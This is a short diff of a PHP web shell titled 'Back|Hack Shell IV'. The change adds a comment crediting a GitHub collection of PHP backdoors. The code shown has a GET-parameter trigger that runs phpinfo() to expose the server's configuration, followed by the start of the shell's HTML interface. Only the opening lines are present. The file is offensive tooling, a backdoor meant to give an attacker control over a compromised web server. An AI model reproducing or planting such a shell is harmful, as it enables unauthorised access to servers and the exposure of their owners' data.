@@ -1,4 +1,6 @@
-<?php if(isset($_GET['phpinfo'])) { echo "<a href='?home' style='color:black;'>Back To Home</a>"; phpinfo(); echo "<script>"; } ?><?php echo '
+<?php 
+// from https://github.com/1337r0j4n/php-backdoors
+if(isset($_GET['phpinfo'])) { echo "<a href='?home' style='color:black;'>Back To Home</a>"; phpinfo(); echo "<script>"; } ?><?php echo '
 <title><< Back|Hack Shell IV</title>
 <style>
 th{
